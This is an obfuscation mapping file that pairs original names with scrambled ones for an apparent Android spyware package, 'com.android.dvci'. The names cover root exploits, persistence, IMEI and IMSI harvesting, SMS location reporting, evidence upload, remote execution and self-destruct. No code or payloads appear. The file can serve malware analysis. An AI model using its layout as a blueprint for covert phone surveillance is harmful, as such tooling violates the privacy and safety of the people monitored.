android.media.AmrInputStream -> android.media.AmrInputStream:
    com.android.dvci.Core this$0 -> lua_for
    429:430:void run() -> run
com.android.dvci.Device -> stt.myarray:
    com.android.dvci.Device singleton -> lua_if
    java.lang.String sdk -> lua_in
    42:50:com.android.dvci.Device self() -> lua_nil
    61:73:java.lang.String getPhoneNumber() -> lua_not
    77:81:boolean isPhoneNumber(java.lang.String) -> inst
    90:96:byte[] getVersion() -> lua_or
    105:105:boolean isCdma() -> lua_repeat
    109:109:boolean isGprs() -> lua_return
    114:114:boolean isSimulator() -> lua_then
    126:144:java.lang.String getImei() -> lua_true
    156:171:java.lang.String getImsi() -> lua_until
    175:243:com.android.dvci.CellInfo getCellInfo() -> lua_while
com.android.dvci.GeneralException -> stt.invoked:
com.android.dvci.LinuxExploitThread -> stt.zygoteapp:
    boolean frama -> lua_local
    boolean selinux -> lua_nil
    boolean towel -> lua_not
    java.util.concurrent.Semaphore semaphore -> lua_or
    41:92:void run() -> run
    96:130:void runFramalinuxExploit() -> header
    141:145:boolean pidAlive(java.lang.String) -> variables
    162:184:boolean pidSeExAlive(java.lang.String) -> mylist
    197:241:java.lang.String pidOf(java.lang.String) -> myarray
    244:305:void runSelinuxExploit() -> string_ids
    310:371:void runTowelExploit() -> type_ids
    376:398:boolean checkSelinuxExecution(java.lang.String) -> invoked
com.android.dvci.MessagesDecrypt -> stt.zygotevar:
    byte[] $ -> lua_repeat
    104:134:javax.crypto.SecretKey produceKey(java.lang.String) -> zygoteapp
    java.lang.String $$24d420ae() -> proto_ids
com.android.dvci.Packet -> stt.zygoteclass:
    int type -> type
    int command -> lua_return
    long id -> id
    byte[] data -> lua_then
    byte[] additional -> lua_true
    java.util.ArrayList items -> lua_until
    int dataLen -> lua_while
    85:85:long getId() -> getId
    95:96:void setCommand(int) -> localclass
    104:104:int getCommand() -> field_ids
    115:116:void setType(int) -> setType
    124:124:int getType() -> getType
    134:136:void setData(byte[]) -> setData
    139:142:void setData(byte[],int) -> instance
    150:150:byte[] getData() -> getData
    154:154:int getDataLength() -> method_ids
    163:163:byte[] getAdditional() -> class_defs
    173:174:void setAdditional(byte[]) -> variables
    178:178:java.util.ArrayList getItems() -> data
com.android.dvci.ProcessInfo -> stt.mymethod:
    java.lang.String processInfo -> header
    com.android.dvci.ProcessStatus status -> string_ids
    34:34:java.lang.String toString() -> toString
com.android.dvci.ProcessStatus -> stt.myclass:
    com.android.dvci.ProcessStatus START -> type_ids
    com.android.dvci.ProcessStatus STOP -> proto_ids
    com.android.dvci.ProcessStatus[] $VALUES -> field_ids
    12:12:com.android.dvci.ProcessStatus[] values() -> values
    12:12:com.android.dvci.ProcessStatus valueOf(java.lang.String) -> valueOf
com.android.dvci.Root -> stt.myvar:
    java.lang.String method -> method
    java.util.Date startExploiting -> method_ids
    int askedSu -> class_defs
    java.lang.String SU -> data
    java.util.concurrent.Semaphore semGetPermission -> link_data
    com.android.dvci.evidence.Markup markup -> magic
    java.lang.String[] appToDisable -> checksum
    67:84:boolean installed(java.lang.String) -> zygotevar
    140:220:boolean exploitPhone(boolean) -> localclass
    225:226:boolean isArtInUse() -> link_data
    231:276:void adjustOom() -> magic
    318:321:void addOldFileMarkup(java.lang.String) -> zygoteclass
    324:336:void delOldFileMarkup(java.lang.Boolean) -> Code
    339:434:boolean uninstallRoot() -> checksum
    439:517:boolean installPersistence(java.lang.Boolean) -> localvar
    523:542:void supersuRoot() -> signature
    546:593:void standardShell() -> file_size
    599:644:void selinuxShell() -> header_size
    692:705:boolean checkCyanogenmod() -> endian_tag
    709:750:boolean checkFramarootExploitability() -> link_size
    755:792:boolean checkSELinuxExploitability() -> link_off
    798:835:boolean checkTowelExploitability() -> map_off
    840:861:void checkExploitThread(java.lang.Thread,int) -> Code
    870:875:void installPersistence() -> string_ids_size
    903:935:void linuxExploit(boolean,boolean,boolean,boolean) -> Code
    940:940:boolean createScript(java.lang.String,java.lang.String) -> Code
    944:964:boolean createScript(java.lang.String,java.lang.String,java.lang.String) -> Code
    991:1003:void removeScript(java.lang.String) -> mymethod
    1013:1077:boolean getPermissions(boolean) -> instance
    1084:1108:java.io.InputStream decodeEnc(java.io.InputStream,java.lang.String) -> Code
    52:52:void access$000(java.lang.Thread,int) -> localvar
com.android.dvci.Root$1CET -> stt.sort:
    java.lang.Thread exploit -> signature
    888:898:void run() -> run
com.android.dvci.RunningProcesses -> stt.quicksort:
    com.android.dvci.RunningProcesses instance -> file_size
    java.lang.String foreground -> header_size
    android.app.ActivityManager activityManager -> endian_tag
    36:39:com.android.dvci.RunningProcesses self() -> string_ids_off
    43:52:java.lang.String getForeground_L() -> type_ids_size
    56:64:java.lang.String getForeground() -> type_ids_off
    68:80:java.lang.String getForeground_wrapper() -> proto_ids_size
com.android.dvci.ServiceMain -> com.android.dvci.ServiceMain:
    com.android.dvci.listener.BSt bst -> link_size
    com.android.dvci.listener.BAc bac -> link_off
    com.android.dvci.listener.BSm bsm -> map_off
    com.android.dvci.listener.BC bc -> string_ids_size
    com.android.dvci.listener.WR wr -> string_ids_off
    java.lang.Boolean listenersRegistered -> type_ids_size
    com.android.dvci.Core core -> type_ids_off
    long mersenne -> proto_ids_size
    byte[] $ -> lua_repeat
    40:40:android.os.IBinder onBind(android.content.Intent) -> onBind
    45:74:void onCreate() -> onCreate
    77:88:long deceptionCode3() -> proto_ids_off
    93:103:boolean isPrime(long) -> localvar
    108:144:void onStart(android.content.Intent,int) -> onStart
    148:162:void onDestroy() -> onDestroy
    166:189:void registerReceivers() -> field_ids_size
    195:210:void unregisterReceiver() -> field_ids_off
    213:214:void stopListening() -> stopListening
    218:224:void onConfigurationChanged(android.content.res.Configuration) -> onConfigurationChanged
    228:234:void onLowMemory() -> onLowMemory
    238:243:void onRebind(android.content.Intent) -> onRebind
    247:253:boolean onUnbind(android.content.Intent) -> onUnbind
    25:25:long access$000$13b20fb3() -> method_ids_size
    java.lang.String $(int,int,int) -> localvar
com.android.dvci.ServiceMain$1 -> stt.evaluate:
    com.android.dvci.ServiceMain this$0 -> proto_ids_off
    136:139:void run() -> run
com.android.dvci.Sim -> stt.eval:
    java.lang.String imsi -> field_ids_size
    20:20:java.lang.String getImsi() -> lua_until
    214:214:java.lang.String getMemo$47921032() -> method_ids_off
com.android.dvci.Standby -> stt.fingerprint:
    boolean status -> Code
    20:20:boolean getStatus() -> Code
    28:28:boolean isScreenOff() -> class_defs_size
    43:65:com.musicg.wave.Wave resampleRaw(com.musicg.wave.WaveHeader,byte[]) -> Code
    70:92:com.musicg.wave.WaveHeader createHeader(int,int) -> Code
com.android.dvci.Status -> stt.openfile:
    java.util.HashMap modulesMap -> field_ids_off
    java.util.HashMap eventsMap -> method_ids_size
    java.util.HashMap actionsMap -> method_ids_off
    com.android.dvci.conf.Globals globals -> class_defs_size
    java.util.ArrayList[] triggeredActions -> class_defs_off
    boolean synced -> data_size
    int drift -> data_off
    android.content.Context context -> a
    java.lang.Object lockCrisis -> b
    boolean crisis -> c
    boolean[] crisisType -> d
    boolean haveRoot -> e
    boolean haveSu -> f
    java.lang.Object[] triggeredSemaphore -> g
    boolean uninstall -> h
    android.os.PowerManager$WakeLock wl -> i
    java.lang.Object uninstallLock -> j
    java.util.Date startedTime -> k
    boolean deviceAdmin -> l
    int haveCamera -> m
    boolean reload -> n
    boolean wifiConnected -> o
    boolean gsmConnected -> p
    int exploitStatus -> q
    int exploitResult -> r
    java.lang.String persistencyPackage -> s
    java.lang.String persistencyApk -> t
    int persistencyStatus -> u
    com.android.dvci.RunningProcesses runningProcess -> v
    java.lang.Object lockFramebuffer -> w
    com.android.dvci.Status singleton -> x
    android.os.Handler deafultHandler -> y
    174:182:com.android.dvci.Status self() -> class_defs_off
    189:196:void clean() -> data_size
    213:219:void setAppContext(android.content.Context) -> Code
    231:231:android.content.Context getAppContext() -> data_off
    247:247:boolean isGuiVisible() -> a
    251:251:android.content.ContentResolver getContentResolver() -> getContentResolver
    256:256:android.os.Handler getDefaultHandler() -> b
    268:281:void addModule$7813568e(com.android.dvci.conf.ChildConf) -> Code
    297:305:boolean addEvent(com.android.dvci.conf.ConfEvent) -> Code
    322:323:void addAction(com.android.dvci.action.Action) -> Code
    326:326:int getExploitStatus() -> c
    330:331:void setExploitStatus(int) -> instance
    338:339:void setExploitResult(int) -> inst
    343:355:java.lang.String getExploitStatusString() -> d
    359:371:java.lang.String getExploitResultString() -> e
    376:377:void setGlobal(com.android.dvci.conf.Globals) -> Code
    385:385:int getActionsNumber() -> f
    403:403:int getEventsNumber() -> g
    412:412:java.util.HashMap getModulesMap() -> h
    421:421:java.util.HashMap getEventsMap() -> i
    441:451:com.android.dvci.action.Action getAction(int) -> variables
    462:472:com.android.dvci.conf.ConfEvent getEvent(int) -> mylist
    480:480:com.android.dvci.conf.Globals getGlobals() -> j
    495:533:void triggerAction(int,com.android.dvci.event.BaseEvent) -> Code
    546:588:com.android.dvci.Trigger[] getTriggeredActions(int) -> myarray
    617:640:void unTriggerAction(com.android.dvci.action.Action) -> localvar
    651:674:void unTriggerAll() -> k
    677:679:void setCrisis$2563266(int) -> invoked
    687:689:boolean isCrisis() -> l
    693:695:boolean crisisPosition() -> m
    711:713:boolean crisisMic() -> n
    717:719:boolean crisisSync() -> o
    726:728:void startCrisis() -> p
    735:737:void stopCrisis() -> q
    741:741:boolean haveRoot() -> r
    745:746:void setRoot(boolean) -> inst
    749:749:boolean haveSu() -> s
    753:754:void setSu(boolean) -> variables
    757:757:java.util.concurrent.ScheduledExecutorService getStpe() -> t
    768:772:void acquirePowerLock() -> u
    787:788:void setDeviceAdmin(boolean) -> mylist
    791:791:boolean haveAdmin() -> v
    795:811:void makeToast(java.lang.String) -> myclass
    814:815:void setReload() -> w
    818:818:boolean wantsReload() -> x
    822:823:void unsetReload() -> y
    826:826:java.lang.String getForeground() -> type_ids_off
    845:865:boolean checkCameraHardware() -> z
    873:873:void setIconState$171db248() -> A
    916:926:android.content.pm.PackageInfo getMyPackageInfo() -> B
    931:934:boolean haveCamera() -> C
    944:950:java.lang.Boolean needReboot() -> D
    954:958:java.lang.String getApkName() -> E
    962:966:java.lang.String getAppDir() -> F
    974:978:java.lang.Boolean isPersistent() -> G
    986:996:java.lang.Boolean persistencyReady() -> H
    1000:1001:void setPersistencyStatus(int) -> zygoteapp
    1004:1004:int getPersistencyStatus() -> I
    1008:1024:java.lang.String getPersistencyStatusStr() -> J
    1029:1032:boolean isMelt() -> K
    1049:1049:boolean isBlackberry() -> L
    45:45:android.content.Context access$000() -> M
com.android.dvci.Status$1 -> stt.closefile:
    java.lang.String val$message -> z
    com.android.dvci.Status this$0 -> A
    802:803:void run() -> run
com.android.dvci.ThreadBase -> stt.constants:
    long period -> period
    long delay -> B
    boolean stopRequest -> C
    boolean suspended -> D
    int status$63a04384 -> E
    void actualGo() -> N
    void actualStart() -> O
    void actualStop() -> P
    70:115:void run() -> run
    124:196:void loop() -> loop
    203:206:void next() -> Q
    213:217:void stopThread() -> R
    220:220:boolean isStopRequested() -> S
    233:235:void setPeriod(long) -> localclass
    247:249:void setDelay(long) -> instance
    261:261:boolean isRunning() -> isRunning
    265:269:void suspend() -> suspend
    272:277:void resume() -> resume
    283:283:boolean isSuspended() -> T
com.android.dvci.Trigger -> stt.globalize:
    int actionId -> actionId
    java.lang.ref.WeakReference event -> F
    17:17:int getActionId() -> U
    26:29:boolean equals(java.lang.Object) -> equals
    35:35:int hashCode() -> hashCode
com.android.dvci.action.Action -> stt.main:
    java.util.ArrayList list$7865b31 -> G
    int actionId -> actionId
    java.lang.String desc -> H
    int queue -> lua_function
    74:74:int getId() -> getId
    83:83:int getSubActionsNum() -> V
    99:122:boolean addSubAction(com.android.dvci.conf.ConfAction) -> Code
    127:128:void setQueue$13462e() -> W
    149:153:com.android.dvci.action.SubAction getSubAction(int) -> zygotevar
    157:157:com.android.dvci.action.SubAction[] getSubActions() -> X
    161:161:int getQueue() -> Y
    172:172:java.lang.String toString() -> toString
com.android.dvci.action.DestroyAction -> stt.lua:
    boolean permanent -> I
    30:34:boolean parse(com.android.dvci.conf.ConfAction) -> localvar
    41:55:boolean execute(com.android.dvci.Trigger) -> Code
    59:75:void destroyUser() -> Z
    80:88:void destroyAdmin() -> aa
    91:92:void destroyRoot() -> ab
com.android.dvci.action.DisableEventAction -> stt.lua_main:
    22:27:boolean execute(com.android.dvci.Trigger) -> Code
com.android.dvci.action.EnableEventAction -> stt.lua_and:
    22:27:boolean execute(com.android.dvci.Trigger) -> Code
com.android.dvci.action.EventAction -> stt.lua_break:
    int eventId -> J
    19:32:boolean parse(com.android.dvci.conf.ConfAction) -> localvar
com.android.dvci.action.ExecuteAction -> stt.lua_do:
    java.lang.String command -> K
    49:66:boolean parse(com.android.dvci.conf.ConfAction) -> localvar
    78:98:boolean execute(com.android.dvci.Trigger) -> Code
com.android.dvci.action.LogAction -> stt.lua_else:
    java.lang.String msg -> L
    47:49:boolean execute(com.android.dvci.Trigger) -> Code
    56:68:boolean parse(com.android.dvci.conf.ConfAction) -> localvar
com.android.dvci.action.ModuleAction -> stt.lua_elseif:
    java.lang.String moduleId -> M
    java.lang.String moduleStr -> N
    42:54:boolean parse(com.android.dvci.conf.ConfAction) -> localvar
com.android.dvci.action.SmsAction -> stt.lua_end:
    android.telephony.SmsManager sm -> O
    java.lang.String number -> variables
    java.lang.String text -> P
    int type -> type
    java.lang.String descrType -> Q
    70:135:boolean parse(com.android.dvci.conf.ConfAction) -> localvar
    159:183:boolean execute(com.android.dvci.Trigger) -> Code
    192:195:void errorLocation() -> ac
    203:217:boolean getCellPosition() -> ad
    224:227:void getGPSPosition() -> ae
    236:242:void sendSMS(java.lang.String) -> myvar
    252:258:java.lang.String toString() -> toString
    264:291:void onLocationChanged(android.location.Location) -> onLocationChanged
com.android.dvci.action.StartModuleAction -> stt.lua_false:
    44:47:boolean execute(com.android.dvci.Trigger) -> Code
com.android.dvci.action.StopModuleAction -> stt.lua_for:
    30:33:boolean execute(com.android.dvci.Trigger) -> Code
com.android.dvci.action.SubAction -> stt.lua_function:
    java.lang.String startStr -> R
    java.lang.String stopStr -> S
    com.android.dvci.conf.ConfAction conf -> T
    com.android.dvci.Status status -> U
    boolean finished -> V
    boolean stop -> W
    69:156:com.android.dvci.action.SubAction factory(java.lang.String,com.android.dvci.conf.ConfAction) -> Code
    boolean parse(com.android.dvci.conf.ConfAction) -> localvar
    boolean execute(com.android.dvci.Trigger) -> Code
    198:202:void prepareExecute() -> af
    210:210:java.lang.String toString() -> toString
    215:215:boolean considerStop() -> ag
com.android.dvci.action.SubActionSlow -> stt.lua_if:
com.android.dvci.action.SyncAction -> stt.lua_in:
    com.android.dvci.evidence.EvidenceCollector logCollector -> X
    com.android.dvci.manager.ManagerModule moduleManager -> lua_and
    java.util.Vector transports -> Y
    com.android.dvci.action.sync.ZProtocol protocol$10d1ccf2 -> Z
    boolean initialized -> aa
    90:198:boolean execute(com.android.dvci.Trigger) -> Code
    boolean initTransport() -> ah
com.android.dvci.action.SyncActionApn -> stt.lua_local:
    39:39:boolean execute(com.android.dvci.Trigger) -> Code
    45:45:boolean parse(com.android.dvci.conf.ConfAction) -> localvar
com.android.dvci.action.SyncActionInternet -> stt.lua_nil:
    boolean wifiForced -> ab
    boolean wifi -> ac
    boolean gprs -> ad
    java.lang.String host -> ae
    58:100:boolean parse(com.android.dvci.conf.ConfAction) -> localvar
    110:130:boolean initTransport() -> ah
com.android.dvci.action.UninstallAction -> stt.lua_not:
    byte[] $ -> lua_repeat
    59:60:boolean execute(com.android.dvci.Trigger) -> Code
    70:107:boolean actualExecute() -> ai
    111:127:boolean removeRoot() -> aj
    135:153:void removeAdmin(android.content.Context) -> localvar
    165:169:boolean stopServices() -> ak
    182:188:boolean removeFiles() -> al
    192:214:boolean deleteApplication() -> am
    226:241:boolean deleteApplicationIntent() -> an
    250:260:boolean deleteApplicationRoot() -> ao
    265:265:boolean parse(com.android.dvci.conf.ConfAction) -> localvar
    java.lang.String $(int,int,int) -> localvar
com.android.dvci.action.sync.CommandException -> stt.lua_or:
com.android.dvci.action.sync.GprsTransport -> stt.lua_repeat:
    36:36:boolean isAvailable() -> isAvailable
    42:42:boolean enable() -> enable
    52:65:boolean haveInternet() -> ap
com.android.dvci.action.sync.HttpKeepAliveTransport -> stt.lua_return:
    org.apache.http.impl.client.DefaultHttpClient httpclient -> af
    67:159:byte[] command(byte[]) -> mylist
    168:190:void start() -> start
    194:200:void close() -> close
com.android.dvci.action.sync.HttpTransport -> stt.lua_then:
    java.lang.String host -> ae
    java.util.List cookies -> ag
    boolean stop -> W
    boolean follow_moved -> ah
    java.lang.String HEADER_CONTENTTYPE -> ai
    java.lang.String HEADER_SETCOOKIE -> aj
    java.lang.String HEADER_CONTENTLEN -> ak
    java.lang.String CONTENT_TYPE -> CONTENT_TYPE
    byte[] $ -> lua_repeat
    94:95:void close() -> close
    110:184:byte[] command(byte[]) -> mylist
    java.lang.String $$24d420ae() -> proto_ids
com.android.dvci.action.sync.HttpTransport$1 -> stt.lua_true:
    com.android.dvci.action.sync.HttpTransport this$0 -> al
    120:120:long getKeepAliveDuration(org.apache.http.HttpResponse,org.apache.http.protocol.HttpContext) -> getKeepAliveDuration
com.android.dvci.action.sync.Protocol -> stt.lua_until:
    java.lang.String UPGRADE_FILENAME -> am
    java.lang.Object configLock -> an
    com.android.dvci.action.sync.Transport transport -> ao
    com.android.dvci.Status status -> U
    java.util.HashSet blackListDir$5a95723b -> ap
    byte[] $ -> lua_repeat
    80:83:boolean init(com.android.dvci.action.sync.Transport) -> Code
    95:109:boolean saveNewConf$49634b8b(byte[]) -> myarray
    121:135:void saveUpload(java.lang.String,byte[]) -> Code
    145:209:boolean upgradeMulti(java.util.Vector) -> Code
    227:253:void saveDownloadLog(java.lang.String) -> sort
    275:302:void saveFileLog(java.io.File,java.lang.String) -> Code
    320:344:byte[] logDownloadAdditional(java.lang.String) -> quicksort
    354:379:void saveFilesystem(int,java.lang.String) -> Code
    391:394:void expandRoot(com.android.dvci.evidence.EvidenceBuilder,int) -> Code
    416:463:boolean saveFilesystemLog(com.android.dvci.evidence.EvidenceBuilder,java.lang.String) -> Code
    474:489:void saveRootLog(com.android.dvci.evidence.EvidenceBuilder) -> Code
    515:550:void expandPath(com.android.dvci.evidence.EvidenceBuilder,java.lang.String,int,boolean) -> Code
    559:565:java.lang.String normalizeFilename(java.lang.String) -> evaluate
    java.lang.String $(int,int,int) -> localvar
com.android.dvci.action.sync.ProtocolException -> stt.lua_while:
    boolean bye -> aq
com.android.dvci.action.sync.Transport -> stt.header:
    int timeout -> ar
    java.lang.String baseurl -> as
    50:50:java.lang.String toString() -> toString
    boolean isAvailable() -> isAvailable
    boolean enable() -> enable
    byte[] command(byte[]) -> mylist
    void start() -> start
    void close() -> close
    90:90:java.lang.String getUrl() -> getUrl
com.android.dvci.action.sync.TransportException -> stt.string_ids:
com.android.dvci.action.sync.WifiTransport -> stt.type_ids:
    boolean forced -> at
    boolean switchedOn -> au
    android.net.wifi.WifiManager wifi -> av
    android.net.ConnectivityManager connManager -> aw
    72:89:boolean isAvailable() -> isAvailable
    98:151:boolean enable() -> enable
    156:168:void close() -> close
    29:29:int notification(java.lang.Object) -> Code
com.android.dvci.action.sync.ZProtocol -> stt.proto_ids:
    com.android.dvci.crypto.EncryptionPKCS5 cryptoK -> ax
    com.android.dvci.crypto.EncryptionPKCS5 cryptoConf -> ay
    byte[] Kd -> az
    byte[] Nonce -> aA
    java.util.Vector upgradeFiles -> aB
    java.security.SecureRandom random -> aC
    122:186:boolean perform() -> aq
    206:224:boolean authentication() -> ar
    241:244:boolean[] identification() -> as
    248:255:void purge(boolean) -> myarray
    266:293:void newConf(boolean) -> invoked
    304:308:void download(boolean) -> zygoteapp
    319:329:void upload(boolean) -> zygotevar
    340:358:void upgrade(boolean) -> zygoteclass
    369:376:void filesystem(boolean) -> mymethod
    379:386:void execute(boolean) -> myclass
    400:402:void evidences() -> at
    415:417:void end() -> end
    427:474:byte[] forgeAuthentication() -> au
    485:553:boolean parseAuthentication(byte[]) -> invoked
    562:587:byte[] forgeIdentification() -> av
    598:656:boolean[] parseIdentification(byte[]) -> zygoteapp
    661:682:void parsePurge(byte[]) -> zygotevar
    694:739:int parseNewConf(byte[]) -> zygoteclass
    751:793:void parseDownload(byte[]) -> mymethod
    804:855:boolean parseUpload(byte[]) -> myclass
    868:921:boolean parseUpgrade(byte[]) -> myvar
    932:972:void parseFileSystem(byte[]) -> sort
    975:990:com.android.dvci.util.ExecuteResult resetPassword() -> aw
    994:1045:void parseExecute(byte[]) -> quicksort
    1051:1094:void purgeEvidences(java.lang.String,java.util.Date,int) -> Code
    1107:1164:void sendEvidences(java.lang.String) -> eval
    1167:1198:boolean sendEvidence(com.android.dvci.file.AutoFile) -> Code
    1203:1274:boolean sendResumeEvidence(com.android.dvci.file.AutoFile) -> localvar
    1279:1296:int adaptChunk(int,long,long) -> Code
    1300:1301:void writeBuf$7dd4fa8e(byte[],byte[]) -> Code
    1304:1305:void writeBuf(byte[],int,int) -> Code
    1308:1309:void writeBuf$5c8eef6e(byte[],byte[]) -> localvar
    1319:1319:boolean parseLog(byte[]) -> evaluate
    1330:1337:int parseLogOffset(byte[]) -> eval
    1347:1348:void parseEnd(byte[]) -> fingerprint
    1361:1361:byte[] command(int) -> zygoteclass
    1379:1396:byte[] command(int,byte[]) -> Code
    1424:1436:byte[] cypheredWriteReadSha(byte[]) -> openfile
    1448:1463:boolean checkOk(byte[]) -> closefile
com.android.dvci.auto.Cfg -> stt.field_ids:
    boolean BLACKBERRY -> aD
    boolean PERSISTENCE -> aE
    boolean DEMO -> aF
    boolean DEMO_SILENT -> aG
    boolean FILE -> aH
com.android.dvci.conf.ChildConf -> stt.method_ids:
